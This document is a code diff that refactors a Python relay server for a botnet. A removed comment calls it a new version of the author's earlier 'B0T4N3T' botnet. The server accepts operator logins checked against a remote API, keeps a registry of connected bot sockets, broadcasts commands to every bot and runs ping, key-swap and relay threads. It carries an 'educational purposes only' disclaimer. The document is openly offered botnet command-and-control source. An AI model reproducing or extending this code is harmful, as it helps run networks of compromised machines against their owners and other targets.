@@ -1,27 +1,31 @@
 #!/usr/bin/python3
 
-from socket import socket as Sock
-from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
-import threading
+from socket import (
+    socket as Sock,
+    SOL_SOCKET,
+    SO_KEEPALIVE,
+    SO_REUSEADDR,
+)
+from threading import Thread
 from sys import exit, argv
 from time import sleep, asctime, localtime
-from colorama import Fore, init as colorama_init
-import hashlib
-from cryptography.fernet import Fernet
-from requests import get as rget
+from colorama import (
+    Fore, 
+    init as colorama_init,
+)
+from hashlib import sha256
+from requests import (
+    get as rget,
+    Response,
+)
 from modules.config import RelayConfig
 from modules.loops import Loops
 from modules.relay import Relay
 
-
-__filename__="relay"
-__version__="3.0"
-__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
-__infos__="This is a 'new version' of my old botnet B0T4N3T"
-
+__filename__ = "relay"
+__legit__ = "I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
 
 config: RelayConfig = RelayConfig(True)
-
 
 def log(
     data: str,
@@ -44,23 +48,23 @@ def broadcast(
 ) -> None:
     log(f"send {data}")
 
-    for bot in config.bots.keys():
+    for bot in config.bots_sock.keys():
         try: send(bot, f'{data}', False, False)
         except Exception:
-            config.bots.pop(bot)
+            config.bots_sock.pop(bot)
             bot.close()
 
 def find_login(
     username: str,
     password: str,
 ) -> bool:
-    password: str = hashlib.sha256(password.encode()).hexdigest()
+    password: str = sha256(password.encode()).hexdigest()
 
-    url: str = f"{config.API_URL}/login.php?urlkey={config.URL_KEY}&usr={username}&pass={password}"
+    url: str = f"{config.API_URL}/login?urlkey={config.URL_KEY}&username={username}&password={password}"
     log(f"\n\n{url}\n\n\n\n")
-    res: str = rget(url, timeout=5000).json()
+    res: Response = rget(url, timeout=5000)
 
-    return res == "ok"
+    return res.status_code == 200
 
 def update_title(
     self,
@@ -79,8 +83,6 @@ def update_title(
 
         except Exception: client.close()
 
-
-
 def handle_client(
     client: Sock,
     address: tuple[str, int],
@@ -92,6 +94,7 @@ def handle_client(
         username = client.recv(1024).decode().strip()
         if not username:
             continue
+
         break
 
     password = ''
@@ -113,9 +116,9 @@ def handle_client(
             client.close()
             return
 
-        threading.Thread(target=update_title, args=(client, username)).start()
+        Thread(target=update_title, args=(client, username)).start()
 
-    else: config.bots.update({client: address})
+    else: config.bots_sock.update({client: address})
 
 def main() -> None:
     port: int = None
@@ -149,14 +152,14 @@ def main() -> None:
     loop: Loops = Loops(config=config)
     relay: Relay = Relay(config=config)
 
-    threading.Thread(target=loop.ping).start()
-    threading.Thread(target=loop.net).start()
-    threading.Thread(target=loop.genkey).start()
-    threading.Thread(target=relay.relay).start()
+    Thread(target=loop.ping).start()
+    Thread(target=loop.net).start()
+    Thread(target=loop.gen_swap_key).start()
+    Thread(target=relay.relay).start()
 
     while 1:
         log("listen...\n")
-        threading.Thread(target=handle_client, args=[*s.accept()]).start()
+        Thread(target=handle_client, args=[*s.accept()]).start()
 
 if __name__ == '__main__':
     print(f"\nLegit: {__legit__}\n")
